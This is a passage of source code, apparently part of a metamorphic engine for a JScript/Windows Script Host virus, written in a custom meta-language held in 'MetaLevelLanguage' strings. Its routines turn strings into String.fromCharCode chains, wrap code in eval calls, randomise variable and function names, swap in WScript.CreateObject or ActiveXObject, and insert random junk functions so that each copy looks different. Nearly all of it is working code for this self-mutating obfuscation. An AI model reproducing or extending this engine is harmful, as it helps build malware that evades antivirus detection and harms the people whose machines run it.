    MetaLevelLanguage+='__(CE0300|)000';
    MetaLevelLanguage+='__(CE0400|CE0100)if(#x1°+CERnd1+°1x#!#x2#n4n#2x#?<)001';      
        MetaLevelLanguage+='__(CEA100|)xreturn(#x1°+argCreateExecution1+°1x#)'; 
    MetaLevelLanguage+='__(CE0500|)000';    
    MetaLevelLanguage+='__(CE0600|CE0200,CE0400)if(#x1°+CERnd1+°1x#!#x2#n6n#2x#?<)006';
        MetaLevelLanguage+='__(CEA100|)if(#x1#O1°+argCreateExecution1+°#.substring(#x2#n0n#2x#,#x3#n7n#3x#)1O#1x#!#x4#""return(""#4x#?!=)004';  
            MetaLevelLanguage+='__(CEAA100|)var CEVariableString=#x1fGetVariableList(#x2°+argCreateExecution1+°2x#)1x#';
            MetaLevelLanguage+='__(CEAA200|CEAA100)y°+argCreateExecution1+°=#x1fRemoveVariableMask(#x2°+argCreateExecution1+°2x#)1x#';
            MetaLevelLanguage+='__(CEAA250|CEAA100)y°+argCreateExecution1+°=#x1fRemoveVariableIndicator(#x2°+argCreateExecution1+°2x#)1x#';                 
            MetaLevelLanguage+='__(CEAA300|CEAA200,CEAA250)xreturn(#x1#x2#""eval(""#2x#+#x3fCreateString(#x6°+argCreateExecution1+°6x#)3x#+#x4#"")""#4x#+ #x5°+CEVariableString+°5x#1x#)';      
        MetaLevelLanguage+='__(CEA200|)000';
    MetaLevelLanguage+='__(CE0700|)000';
    MetaLevelLanguage+='__(CE0750|CE0400,CE0600)if(#x1#O1°+argCreateExecution1+°#.indexOf(#x2#""eva""#+#""l(""#2x#)1O#1x#!#x3#n-1n#3x#?!=)001';
        MetaLevelLanguage+='__(CEA100|)xreturn(#x1°+argCreateExecution1+°1x#)'; 
    MetaLevelLanguage+='__(CE0760|)000';              
    MetaLevelLanguage+='__(CE0800|)var CERnd2=#x1fGiveRandomString()1x#';
    MetaLevelLanguage+='__(CE0900|CE0750,CE0800)if(#x1°+sRecordFunctionVariables+°1x#!#x2#n0n#2x#?==)003';        
        MetaLevelLanguage+='__(CEA100|)y°+sRecordFunctionFN+°=#x1#O1°+sFunctionNames+°#.length1O#1x#';     
        MetaLevelLanguage+='__(CEA200|)y°+sRecordFunctionVN+°=#x1#O1°+sVarNames+°#.length1O#1x#';     
        MetaLevelLanguage+='__(CEA300|)y°+#O1sFunctionVariableFctName+°#.push(#x1°+CERnd2+°1x#)1O#';
    MetaLevelLanguage+='__(CE1000|)000';
    MetaLevelLanguage+='__(CE1100|CE0900)c+1(°+sRecordFunctionVariables+°)';
    MetaLevelLanguage+='__(CE1200|)var CEVariableList=#x1[]1x#';
    MetaLevelLanguage+='__(CE1300|)var CEVariableRndList=#x1[]1x#';
    MetaLevelLanguage+='__(CE1400|CE1100,CE1200,CE1300)y°+argCreateExecution1+°=#x1fCreateVariableListForFunctionCalls(#x2°+argCreateExecution1+°2x#,#x3°+CEVariableList+°3x#,#x4°+CEVariableRndList+°4x#)1x#';
    MetaLevelLanguage+='__(CE1500|CE1400)y#O1°+sFunctionDefs+°#.push(#x1fCreateExecution(#x2°+argCreateExecution1+°2x#)1x#)1O#';
    MetaLevelLanguage+='__(CE1600|CE1500)y#O1°+sFunctionNames+°#.push(#x1°+CERnd2+°1x#)1O#';
    MetaLevelLanguage+='__(CE1700|CE1500)y#O1°+sFunctionArgs+°#.push(#x1#x2#""(""#2x#+ #x3#O2°+CEVariableRndList+°#.join()2O#3x#+#x4#"")""#4x#1x#)1O#';
    MetaLevelLanguage+='__(CE1800|CE1600,CE1700)c-1(°+sRecordFunctionVariables+°)';
    MetaLevelLanguage+='__(CE1900|CE1800)if(#x1°+sRecordFunctionVariables+°1x#!#x2#n0n#2x#?==)003';
        MetaLevelLanguage+='__(CEA100|)def RecordFctNames=#x1#O1°+sFunctionNames+°#.slice(#x2°+sRecordFunctionFN+°2x#)1O#1x#';
        MetaLevelLanguage+='__(CEA200|)def RecordVNames1=#x1#O1°+sVarNames+°#.slice(#x2°+sRecordFunctionVN+°2x#)1O#1x#';
        MetaLevelLanguage+='__(CEA300|CEA100,CEA200)y#x1#O1°+sFunctionVariableNameArray+°#.push(#x2#O2°+RecordVNames1+°#.concat(#x3°+RecordFctNames+°3x#)2O#2x#)1O#1x#';
    MetaLevelLanguage+='__(CE2000|)000';
    MetaLevelLanguage+='__(CE2100|CE1900)var CEReturnValue1=#x1#O1°+CEVariableList+°#.join(#x2#x3fGiveMeString(#x8#n43n#8x#)3x#+#x4fGiveMeString(#n176n#)4x#2x#+#x5fGiveMeString(#x9#n44n#9x#)+#x6fGiveMeString(#n176n#)6x#+#x7fGiveMeString(#n43n#)7x#5x#)1O#1x#';
    MetaLevelLanguage+='__(CE2200|CE2100)if(#x1#O1°+CEVariableList+°#.length1O#1x#!#x2#n0n#2x#?>)005';           
        MetaLevelLanguage+='__(CEA100|CEA1B0)var SomeRndName=#x1#""""#1x#';    
        MetaLevelLanguage+='__(CEA200|CEA100)c+s(°+SomeRndName+°,#x1#x2fGiveMeString(#x4#n176n#4x#)2x#+#x3fGiveMeString(#x5#n43n#5x#)3x#1x#)';
        MetaLevelLanguage+='__(CEA300|CEA200)c+s(°+SomeRndName+°,#x1°+CEReturnValue1+°1x#)';
        MetaLevelLanguage+='__(CEA400|CEA300)c+s(°+SomeRndName+°,#x1#x2fGiveMeString(#x4#n43n#4x#)2x#+#x3fGiveMeString(#x5#n176n#5x#)3x#1x#)';
        MetaLevelLanguage+='__(CEA500|CEA400)y°+CEReturnValue1+°=#x1°+SomeRndName+°1x#';    
    MetaLevelLanguage+='__(CE2300|)000';
    MetaLevelLanguage+='__(CE2400|CE2200)if(#x1#O1°+argCreateExecution1+°#.substring(#x2#n0n#2x#,#x3#n7n#3x#)1O#1x#!#x4#""return(""#4x#?==)001';
        MetaLevelLanguage+='__(CEA100|)xreturn(#x1#x2#""return(""#2x#+ #x3°+CERnd2+°3x# +#x4#""(""#4x#+#x5 °+CEReturnValue1+° 5x#+#x6#""))""#6x#1x#)';
    MetaLevelLanguage+='__(CE2500|)000';
    MetaLevelLanguage+='__(CE2600|CE2400)xreturn(#x1#x2°+CERnd2+° 2x#+#x3#""(""#3x#+#x4 °+CEReturnValue1+° 4x#+#x5#"")""#5x#1x#)';



MetaLevelLanguage+='__(1600|)function fCreateString(argCreateString1)045'; 
    MetaLevelLanguage+='__(CS0100|)var CSInString=#x1°+argCreateString1+°1x#';
    MetaLevelLanguage+='__(CS0200|CS0100)var CSRNum1=#x1#O1Math#.floor(#x2#x3#O2Math#.random()2O#3x#*#x4#O3°+CSInString+°#.length3O#/#x5#n6n#5x#4x#2x#)1O#1x#';
    MetaLevelLanguage+='__(CS0250|CS0200)if(°+CSRNum1+°!1000?>)001';
        MetaLevelLanguage+='__(CS0200|CS0100)y°+CSRNum1+°=#x1#O1Math#.floor(#x2#x3#O2Math#.random()2O#3x#*#x4#O3°+CSInString+°#.length3O#/#x5#n50n#5x#4x#2x#)1O#1x#'; 
    MetaLevelLanguage+='__(CS0251|)000';
    MetaLevelLanguage+='__(CS0300|CS0250)while(var CSCount1=#x1#n0n#1x#$#x2°+CSCount1+°2x#!#x3°+CSRNum1+°3x#?<@°+CSCount1+°=#x4#x5°+CSCount1+°5x#+#x6#n1n#6x#4x#)002';
        MetaLevelLanguage+='__(CSA100|)var CSRNum2=#x1fGiveRandomNumber(#x2#O2°+CSInString+°#.length2O#2x#)1x#';
        MetaLevelLanguage+='__(CSA200|CSA100)yCSInString=#x1#x2#O1°+CSInString+°#.substring(#n0n#,#x9°+CSRNum2+°9x#)1O#2x#+#x3fGiveMeString(#x4#n64n#4x#)3x#+#x8fGiveMeString(#x5#n64n#5x#)8x#+#x6 #O2°+CSInString+°#.substring(#x7°+CSRNum2+°7x#)2O#6x#1x#';
    MetaLevelLanguage+='__(CS0400|CS0300)var CSSplitStr=#x1#O1°+CSInString+°#.split(#x3#x4fGiveMeString(#x5#n64n#5x#)4x#+#x2fGiveMeString(#x6#n64n#6x#)2x#3x#)1O#1x#';          
    MetaLevelLanguage+='__(CS0500|)var CSRVString=#x1#""""#1x#';  
    MetaLevelLanguage+='__(CS0600|CS0400,CS0500)while(var CSCount2=#x1#n0n#1x#$#x2°+CSCount2+°2x#!#x3#O1°+CSSplitStr+°#.length1O#3x#?<@°+CSCount2+°=#x4#x5°+CSCount2+°5x#+#x6#n1n#6x#4x#)033';
        MetaLevelLanguage+='__(CSA100|)var CSRNum3=#x1fGiveRandomNumber(#x2#n37n#2x#)1x#'; 
        MetaLevelLanguage+='__(CSA150|CSA100)if(#x1DoIWriteMetaCode1x#!#n1n#?==)001';
            MetaLevelLanguage+='__(CSB150|)c+n(°+CSRNum3+°,#x1#n14n#1x#)';       
        MetaLevelLanguage+='__(CSA151|)000';                        
        MetaLevelLanguage+='__(CSA200|CSA150,CSA100)if(#x1°+CSRNum3+°1x#!#x2#n14n#2x#?<)008';     
            MetaLevelLanguage+='__(CSAA100|)while($#x1#O1°+CSSplitStr+°[#x2°+CSCount2+°2x#]#.indexOf(#x3fGiveMeString(#x4#n39n#4x#)3x#)1O#1x#!#x5#n-1n#5x#?!=@)001';
                MetaLevelLanguage+='__(CSAAA100|)y°+CSSplitStr+°[#x1°+CSCount2+°1x#]=#x3#O1°+CSSplitStr+°[#x2°+CSCount2+°2x#]#.replace(#x4fGiveMeString(#n39n#)4x#,#x5fGiveMeString(#n35n#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)+#x6#""+String.fromCharCode(39)+""#6x#+#x7fGiveMeString(#n35n#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)7x#5x#)1O#3x#';
            MetaLevelLanguage+='__(CSAA200|CSAA100)while($#x1#O1°+CSSplitStr+°[#x2°+CSCount2+°2x#]#.indexOf(#x3fGiveMeString(#x4#n35n#4x#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)3x#)1O#1x#!#n-1n#?!=@)001';
                MetaLevelLanguage+='__(CSAAA100|)y°+CSSplitStr+°[#x1°+CSCount2+°1x#]=#x2#O1°+CSSplitStr+°[#x3°+CSCount2+°3x#]#.replace(#x4fGiveMeString(#x6#n35n#6x#)+fGiveMeString(#n35n#)+fGiveMeString(#n35n#)4x#,#x5fGiveMeString(#x7#n39n#7x#)5x#)1O#2x#';
            MetaLevelLanguage+='__(CSAA300|CSAA200)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n39n#2x#)1x#)';
            MetaLevelLanguage+='__(CSAA400|CSAA300)c+s(°+CSRVString+°,#x1°+CSSplitStr+°[#x2°+CSCount2+°2x#]1x#)';
            MetaLevelLanguage+='__(CSAA500|CSAA400)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n39n#2x#)1x#)';
            MetaLevelLanguage+='__(CSAA600|CSAA500)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n43n#2x#)1x#)';
        MetaLevelLanguage+='__(CSA300|)000';
        MetaLevelLanguage+='__(CSA400|CSA150,CSA100)if(#x1°+CSRNum3+°1x#!#x2#n13n#2x#?>)007';
            MetaLevelLanguage+='__(CSAA100|)if(#x1°+CSRNum3+°1x#!#x2#n19n#2x#?<)005';
                MetaLevelLanguage+='__(CSAAA100|)var CSRName1=#x1fGiveRandomString()1x#';
                MetaLevelLanguage+='__(CSAAA200|)y#O1°+sVarDefs+°#.push(#x1fCreateString(#x2°+CSSplitStr+°[#x3°+CSCount2+°3x#]2x#)1x#)1O#';
                MetaLevelLanguage+='__(CSAAA300|CSAAA100,CSAAA200)y#O1°+sVarNames+°#.push(#x1°+CSRName1+°1x#)1O#';
                MetaLevelLanguage+='__(CSAAA400|CSAAA300)c+s(°+CSRVString+°,#x1fDeriveVC(#x2°+CSRName1+°2x#,#x3#n50n#3x#)1x#)';
                MetaLevelLanguage+='__(CSAAA500|CSAAA400)c+s(°+CSRVString+°,#x1fGiveMeString(#x2#n43n#2x#)1x#)';                                                                            
            MetaLevelLanguage+='__(CSAA200|)000';
        MetaLevelLanguage+='__(CSA500|)000';
        MetaLevelLanguage+='__(CSA600|CSA150,CSA100)if(#x1°+CSRNum3+°1x#!#x2#n18n#2x#?>)008';  
            MetaLevelLanguage+='__(CSAA100|)var CSTmpCharCode=#x1#""""#1x#';
            MetaLevelLanguage+='__(CSAA200|CSAA100)while(var CSCount3=#x1#n0n#1x#$#x2°+CSCount3+°2x#!#x3#O1°+CSSplitStr+°[#x4°+CSCount2+°4x#]#.length1O#3x#?<@°+CSCount3+°=#x5#x6°+CSCount3+° 6x#+#x7#n1n#7x#5x#)002';
                MetaLevelLanguage+='__(CSAA100|)c+s(°+CSTmpCharCode+°,#x1fCreateNumeric(#x2#O1°+CSSplitStr+°[#x3°+CSCount2+°3x#]#.charCodeAt(#x4°+CSCount3+°4x#)1O#2x#)1x#)';
                MetaLevelLanguage+='__(CSAA200|CSAA100)c+s(°+CSTmpCharCode+°,#x1fGiveMeString(#x2#n44n#2x#)1x#)';      
            MetaLevelLanguage+='__(CSAA300|CSAA200)y°+CSTmpCharCode+°=#x1#O1°+CSTmpCharCode+°#.substr(#x2#n0n#2x#,#x3#O2°+CSTmpCharCode+°#.length2O#-#x4#n1n#4x#3x#)1O#1x#';    
            MetaLevelLanguage+='__(CSAA400|CSAA300)c+s(°+CSRVString+°,#x1#""String.fromCharCode(""#1x#)';
            MetaLevelLanguage+='__(CSAA500|CSAA400)c+s(°+CSRVString+°,#x1°+CSTmpCharCode+°1x#)';
            MetaLevelLanguage+='__(CSAA600|CSAA500)c+s(°+CSRVString+°,#x1#"")+""#1x#)';                                                    
        MetaLevelLanguage+='__(CSA700|)000';  
    MetaLevelLanguage+='__(CS0700|CS0600)xreturn(#x1#O1°+CSRVString+°#.substring(#x2#n0n#2x#,#x5#x3#O2°+CSRVString+°#.length2O#3x#-#x4#n1n#4x#5x#)1O#1x#)';
    
    
    
//MetaLevelLanguage+='__(1700|)function fPreCompilation()084';          // this is no function in the engine code
    
    // FullArray defintion
    MetaLevelLanguage+='__(PC0100|)def FullArray=#x1[]1x#';
    MetaLevelLanguage+='__(PC0200|PC0100)while(var FillA=#x1#n0n#1x#$#x2°+FillA+°2x#!#x3#n256n#3x#?<@°+FillA+°=#x4#x5°+FillA+°5x# +#x6#n1n#6x#4x#)001';
        MetaLevelLanguage+='__(PCA100|)xFullArray.push([#x1°+FillA+°1x#])';
        
        
    // $CreateObject$ alternatives  
    MetaLevelLanguage+='__(PC0300|orgv)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2#x3fGiveMeString(#x6#n36n#6x#)3x#+#x4#""CreateObject""#4x#+#x5fGiveMeString(#x7#n36n#7x#)5x#2x#)1O#1x#!#x1#n-1n#1x#?!=@)004';
        MetaLevelLanguage+='__(PCA100|)if(#x1fGiveRandomNumber(#x2#n2n#2x#)1x#!0?==)001';
            MetaLevelLanguage+='__(PCA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2#x3fGiveMeString(#n36n#)3x#+#x4#""CreateObject""#4x#+#x5fGiveMeString(#n36n#)5x#2x#,#x6#x7#""WScript""#7x#+#x8fGiveMeString(#n35n#)8x#+#x9#"".CreateObject""#9x#6x#)1O#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)001';
            MetaLevelLanguage+='__(PCB100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2#x3fGiveMeString(#x7#n36n#7x#)3x#+#x4#""CreateObject""#4x#+#x5fGiveMeString(#x8#n36n#8x#)5x#2x#,#x6#""new ActiveXObject""#6x#)1O#1x#';
            
    // Define random variable names                                                
    MetaLevelLanguage+='__(PC0400|orgv,PC0200,PC0300)var CopyMetaLevelLanguage1=#x1sMetaLevelLanguage1x#';    
    MetaLevelLanguage+='__(PC0500|PC0400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x3fGiveMeString(#n41n#)3x#+#x4fGiveMeString(#n118n#)4x#+#x5fGiveMeString(#n97n#)5x#+#x6fGiveMeString(#n114n#)6x#2x#,#x7#x8fGiveMeString(#n41n#)+fGiveMeString(#n100n#)8x#+#x9fGiveMeString(#n101n#)+fGiveMeString(#n102n#)9x#7x#)1O#1x#';
    MetaLevelLanguage+='__(PC0600|PC0400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x4fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)4x#+#x5fGiveMeString(#n105n#)+fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)5x#+#x6fGiveMeString(#n118n#)+fGiveMeString(#n97n#)+fGiveMeString(#n114n#)6x#2x#,#x3#x7fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)7x#+#x8fGiveMeString(#n105n#)+fGiveMeString(#n108n#)8x#+#x9fGiveMeString(#n101n#)+fGiveMeString(#n40n#)9x#3x#)1O#1x#';   // also consider while(var VariableName=...)     
    MetaLevelLanguage+='__(PC0700|PC0400,PC0600)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x6fGiveMeString(#n41n#)+#x9fGiveMeString(#n119n#)+fGiveMeString(#n104n#)9x#6x#+#x7fGiveMeString(#n105n#)+#x8fGiveMeString(#n108n#)+fGiveMeString(#n101n#)8x#+fGiveMeString(#n40n#)7x#2x#,#x3#x4fGiveMeString(#n41n#)+fGiveMeString(#n100n#)4x#+#x5fGiveMeString(#n101n#)+fGiveMeString(#n102n#)5x#3x#)1O#1x#';     
    MetaLevelLanguage+='__(PC0800|PC0500,PC0600,PC0700)while($#x1#O1°+CopyMetaLevelLanguage1+°#.indexOf(#x2#x3fGiveMeString(#n41n#)3x#+#x4fGiveMeString(#n100n#)4x#+#x5fGiveMeString(#n101n#)5x#+#x6fGiveMeString(#n102n#)6x#+#x7fGiveMeString(#n32n#)7x#2x#)1O#1x#!#x8#n-1n#8x#?!=@)008';
        MetaLevelLanguage+='__(PCA100|)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.substring(#x2#x4#O2°+CopyMetaLevelLanguage1+°#.indexOf(#x5#x6fGiveMeString(#n41n#)+fGiveMeString(#n100n#)6x#+#x7fGiveMeString(#n101n#)+fGiveMeString(#n102n#)+fGiveMeString(#n32n#)7x#5x#)2O#4x#+#x3#n1n#3x#2x#)1O#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)var VariableNameGlobal=#x1#O1°+CopyMetaLevelLanguage1+°#.substring(#x2#n4n#2x#,#x3#O2°+CopyMetaLevelLanguage1+°#.indexOf(#x4#""=""#4x#)2O#3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA300|)var PCRandomVariableName=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(PCA400|PCA200,PCA300)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2°+VariableNameGlobal+°2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
            MetaLevelLanguage+='__(PCAA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2°+VariableNameGlobal+°2x#,#x3°+PCRandomVariableName+°3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA500|PCA400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x4fGiveMeString(#n41n#)4x#+#x5fGiveMeString(#n118n#)5x#+#x6fGiveMeString(#n97n#)+fGiveMeString(#n114n#)6x#2x#,#x3#x7fGiveMeString(#n41n#)+fGiveMeString(#n100n#)7x#+#x8fGiveMeString(#n101n#)+fGiveMeString(#n102n#)8x#3x#)1O#1x#'
        MetaLevelLanguage+='__(PCA600|PCA400)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x4fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)+fGiveMeString(#n105n#)4x#+#x5fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)+fGiveMeString(#n118n#)+fGiveMeString(#n97n#)+fGiveMeString(#n114n#)5x#2x#,#x3#x6fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)+fGiveMeString(#n105n#)6x#+#x7fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)7x#3x#)1O#1x#'; 
        MetaLevelLanguage+='__(PCA700|PCA400,PCA600)y°+CopyMetaLevelLanguage1+°=#x1#O1°+CopyMetaLevelLanguage1+°#.replace(#x2#x6fGiveMeString(#n41n#)+fGiveMeString(#n119n#)+fGiveMeString(#n104n#)+fGiveMeString(#n105n#)6x#+#x7fGiveMeString(#n108n#)+fGiveMeString(#n101n#)+fGiveMeString(#n40n#)7x#2x#,#x3#x4fGiveMeString(#n41n#)+fGiveMeString(#n100n#)4x#+#x5fGiveMeString(#n101n#)+fGiveMeString(#n102n#)5x#3x#)1O#1x#';   
    MetaLevelLanguage+='__(PC0900|orgv)var CopyMetaLevelLanguage2=#x1sMetaLevelLanguage1x#';
    MetaLevelLanguage+='__(PC1000|PC0900)while($#x1#O1°+CopyMetaLevelLanguage2+°#.indexOf(#x2#x3#x7fGiveMeString(#n41n#)+fGiveMeString(#n102n#)7x#+#x6fGiveMeString(#n117n#)+fGiveMeString(#n110n#)+fGiveMeString(#n99n#)6x#3x#+#x4fGiveMeString(#n116n#)+#x5fGiveMeString(#n105n#)+fGiveMeString(#n111n#)+fGiveMeString(#n110n#)5x#+fGiveMeString(#n32n#)4x#2x#)1O#1x#!#n-1n#?!=@)014';
        MetaLevelLanguage+='__(PCA100|)y°+CopyMetaLevelLanguage2+°=#x1#O1°+CopyMetaLevelLanguage2+°#.substring(#x2#O2°+CopyMetaLevelLanguage2+°#.indexOf(#x3#x4fGiveMeString(#n41n#)+fGiveMeString(#n102n#)+fGiveMeString(#n117n#)+fGiveMeString(#n110n#)4x#+#x5fGiveMeString(#n99n#)+fGiveMeString(#n116n#)+fGiveMeString(#n105n#)5x#+#x6fGiveMeString(#n111n#)+fGiveMeString(#n110n#)+fGiveMeString(#n32n#)6x#3x#)2O#+#n1n#2x#)1O#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)var PCFunctionName=#x1#O1°+CopyMetaLevelLanguage2+°#.substring(#x2#n9n#2x#,#x3#O2°+CopyMetaLevelLanguage2+°#.indexOf(fGiveMeString(#n40n#))2O#3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA300|)var PCRandomVariableName=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(PCA400|PCA200,PCA300)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2°+PCFunctionName+°2x#)1O#1x#!-1?!=@)001';
            MetaLevelLanguage+='__(PCAA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2°+PCFunctionName+°2x#,#x3°+PCRandomVariableName+°3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA500|PCA100)var PCFctArguments=#x1#O1°+CopyMetaLevelLanguage2+°#.substring(#x2#O2°+CopyMetaLevelLanguage2+°#.indexOf(fGiveMeString(#n40n#))2O#+#n1n#2x#,#x3#O3°+CopyMetaLevelLanguage2+°#.indexOf(#x4fGiveMeString(#n41n#)4x#)3O#3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA600|)var SingleFArguments=#x1#""""#1x#';
        MetaLevelLanguage+='__(PCA700|PCA500,PCA600)if(#x1#O1°+PCFctArguments+°#.length1O#1x#!#x2#n0n#2x#?>)001';
            MetaLevelLanguage+='__(PCAA100|)y°+SingleFArguments+°=#x1#O1°+PCFctArguments+°#.split(#x2fGiveMeString(#x3#n44n#3x#)2x#)1O#1x#';
        MetaLevelLanguage+='__(PCA800|)000';
        MetaLevelLanguage+='__(PCA900|PCA700)while(var PCCount1=#n0n#$#x1°+PCCount1+°1x#!#x2#O1°+SingleFArguments+°#.length1O#2x#?<@°+PCCount1+°=#x3#x4°+PCCount1+°4x# +#x5#n1n#5x#3x#)003';
            MetaLevelLanguage+='__(PCAA100|)var RandomVariableNameArgs=#x1fGiveRandomString()1x#';
            MetaLevelLanguage+='__(PCAA200|PCAA100)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2°+SingleFArguments+°[#x3°+PCCount1+°3x#]2x#)1O#1x#!-1?!=@)001';
                MetaLevelLanguage+='__(PCAAA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2°+SingleFArguments+°[#x3°+PCCount1+°3x#]2x#,#x4°+RandomVariableNameArgs+°4x#)1O#1x#';
    
    // Function Creation
    MetaLevelLanguage+='__(PC1100|PC0200,VDef004,VDef005,VDef006)while(var PCNumberOfFunctionCreation=#n0n#$#x1°+PCNumberOfFunctionCreation+°1x#!#x2#n35n#2x#?<@°+PCNumberOfFunctionCreation+°=#x3#x4°+PCNumberOfFunctionCreation+°4x# +#x5#n1n#5x#3x#)046';     
        MetaLevelLanguage+='__(PCA100|)var PCFgramm=#x1#""(SOS)O(SOS)""#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)while($#x1#O1°+PCFgramm+°#.indexOf(#x2#""S""#2x#)1O#1x#!#x3#n-1n#3x#?!=@)004';
            MetaLevelLanguage+='__(PCAA100|)if(#x1fGiveRandomNumber(#x2#n4n#2x#)1x#!#x3#n0n#3x#?==)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#""S""#2x#,#x3#""(SOS)""#3x#)1O#1x#';
            MetaLevelLanguage+='__(PCAA200|)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#""S""#2x#,#x3#""X""#3x#)1O#1x#';                                            
        MetaLevelLanguage+='__(PCA300|PCA200)while($#x1#O1°+PCFgramm+°#.indexOf(#x2#""O""#2x#)1O#1x#!#x3#n-1n#3x#?!=@)002';
            MetaLevelLanguage+='__(PCAA100|)var PCOperatorArray=#x1[#x2#""+""#2x#,#x3#""+""#3x#,#x4#""-""#4x#,#x5#""-""#5x#,#x6#""*""#6x#,#x7#""%""#7x#]1x#';
            MetaLevelLanguage+='__(PCAA200|PCAA100)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#""O""#2x#,#x3°+PCOperatorArray+°[#x4fGiveRandomNumber(#n6n#)4x#]3x#)1O#1x#'; 
        MetaLevelLanguage+='__(PCA400|)var PCFunctionArguments=#x1[]1x#'; 
        MetaLevelLanguage+='__(PCA500|)var PCFunctionArgLength=#x1#x2fGiveRandomNumber(#n4n#)2x#+#x3#n2n#3x#1x#'; 
        MetaLevelLanguage+='__(PCA600|PCA200,PCA400,PCA500)while(var PCCountRSc1=#x1#n0n#1x#$#x2°+PCCountRSc1+°2x#!#x3°+PCFunctionArgLength+°3x#?!=@°+PCCountRSc1+°=#x4°+PCCountRSc1+° +#n1n#4x#)001';
            MetaLevelLanguage+='__(PCAA100|)y#O1°+PCFunctionArguments+°#.push(#x2fGiveRandomString()2x#)1O#';
        MetaLevelLanguage+='__(PCA700|PCA600)while($#x1#O1°+PCFgramm+°#.indexOf(#x2#""X""#2x#)1O#1x#!#x3#n-1n#3x#?!=@)004';
            MetaLevelLanguage+='__(PCAA100|)if(#x1fGiveRandomNumber(#x3#n2n#3x#)1x#!#x2#n0n#2x#?==)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#""X""#2x#,#x3°+PCFunctionArguments+°[#x4fGiveRandomNumber(#x5#O2°+PCFunctionArguments+°#.length2O#5x#)4x#]3x#)1O#1x#';
            MetaLevelLanguage+='__(PCAA200|)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#""X""#2x#,#x3fGiveRandomNumber(#x4#n256n#4x#)3x#)1O#1x#';  
        MetaLevelLanguage+='__(PCA750|PCA600)var PCVarCount1=#x1#O1°+PCFunctionArguments+°#.length1O#1x#';
        MetaLevelLanguage+='__(PCA800|PCA700,PCA750)while($#x1°+PCVarCount1+°1x#!#x2#n0n#2x#?>@°+PCVarCount1+°=#x3#x4°+PCVarCount1+°4x# -#x5#n1n#5x#3x#)003';
            MetaLevelLanguage+='__(PCAA100|)if(#x1#O1°+PCFgramm+°#.indexOf(#x2°+PCFunctionArguments+°[#x3°+PCVarCount1+°3x#]2x#)1O#1x#!#x4#n-1n#4x#?==)001';
                MetaLevelLanguage+='__(PCAAA100|)y#O1°+PCFunctionArguments+°#.splice(#x1°+PCVarCount1+°1x#,#x2#n1n#2x#)1O#';            
            MetaLevelLanguage+='__(PCAA200|)000';
        MetaLevelLanguage+='__(PCA900|PCA300,PCA800)if(#x1#O1°+PCFunctionArguments+°#.length1O#1x#!#x2#n0n#2x#?>)021';
            MetaLevelLanguage+='__(PCAA100|)var PCFname=#x1fGiveRandomString()1x#';
            MetaLevelLanguage+='__(PCAA200|PCAA100)var PCGgramm=#x1#x2#""function ""#2x#+#x3 °+PCFname+° 3x#+#x4#""(""#4x#+#x5 #O1°+PCFunctionArguments+°#.join()1O#5x#+#x6#""){return(""#6x#+#x7 °+PCFgramm+° 7x#+#x8#"");}""#8x#1x#';            
            MetaLevelLanguage+='__(PCAA300|PCAA200)yeval(#x1°+PCGgramm+°1x#)';
            MetaLevelLanguage+='__(PCAA400|)var PCIsItAUsefulFunction=#x1#n0n#1x#';
